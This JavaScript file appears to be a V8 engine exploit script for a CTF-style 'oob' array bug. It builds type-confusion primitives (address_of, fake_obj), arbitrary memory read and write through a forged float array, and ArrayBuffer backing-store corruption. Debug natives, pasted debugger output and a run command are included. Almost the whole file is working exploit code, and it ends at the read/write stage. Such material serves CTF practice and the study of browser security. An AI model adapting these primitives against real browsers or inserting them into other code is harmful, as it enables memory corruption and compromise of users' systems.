const array_buffer = new ArrayBuffer(8);
let data_view = new DataView(array_buffer);

let u2d = (value) => {
    data_view.setBigUint64(0, value);
    return data_view.getFloat64(0);
};

let d2u = (value) => {
    data_view.setFloat64(0, value);
    return data_view.getBigUint64(0);
};

let hex = (value) => {
    return '0x' + value.toString(16).padStart(16, "0");
}

let test_value = 123n;
console.log("test_value", u2d(test_value), d2u(u2d(test_value)));

let obj = {};
let float_array = [1.1];
let obj_array = [obj];
//----oob() => map----
let float_array_map = float_array.oob();
let obj_array_map = obj_array.oob();
% DebugPrint(float_array);
% DebugPrint(obj_array);

console.log("float_array_map", hex(d2u(float_array_map)));
console.log("obj_array_map", hex(d2u(obj_array_map)));

let address_of = (obj) => {
    float_array.oob(obj_array_map);
    float_array[0] = obj;
    float_array.oob(float_array_map);
    return d2u(float_array[0]);
};

let fake_obj = (address) => {
    // obj_array.oob(float_array_map);
    // obj_array[0] = u2d(address | 1n);
    // obj_array.oob(obj_array_map);
    // return obj_array[0];
    float_array.oob(float_array_map);
    float_array[0] = u2d(address | 1n);
    float_array.oob(obj_array_map);
    return float_array[0];
};

let float_array_mem = [
    float_array_map,
    u2d(0n),
    u2d(0xdeadbeefn),
    u2d(1n << 32n),
];
let fake_float_array = fake_obj(address_of(float_array_mem) + 0x30n);

let read = (address) => {
    float_array_mem[2] = u2d((address - 0x10n) | 1n);
    return d2u(fake_float_array[0]);
};
let write = (address, value) => {
    float_array_mem[2] = u2d((address - 0x10n) | 1n);
    fake_float_array[0] = u2d(value);
};

let array_buffer1 = new ArrayBuffer(0x8);
let data_view1 = new DataView(array_buffer1);
let array_buffer2 = new ArrayBuffer(0x1000);
let data_view2 = new DataView(array_buffer2);

% DebugPrint(array_buffer1);
% DebugPrint(array_buffer2);

write(address_of(array_buffer1) + 0x20n, address_of(array_buffer2) + 0x20n - 0x1n);
% SystemBreak();
/**
0x33a6ed18ea81 <JSArray[1]>
0x33a6ed18eab9 <JSArray[1]>
float_array_map 0x00000e52e5d82ed9
obj_array_map 0x00000e52e5d82f79
0x33a6ed18ef79 <ArrayBuffer map = 0xe52e5d821b9>
0x33a6ed18eff9 <ArrayBuffer map = 0xe52e5d821b9>
 */

let ab_read = (address) => {
    data_view1.setBigUint64(0, address, true);
    return data_view2.getBigUint64(0, true);
};

let ab_write = (address, value) => {
    data_view1.setBigUint64(0, address, true);
    data_view2.setBigUint64(0, value, true);
};

ab_write(0xdeadbeefn, 0x12138n);

% SystemBreak();
/**
 * r --allow-natives-syntax --shell ../exp/exp3.js
 */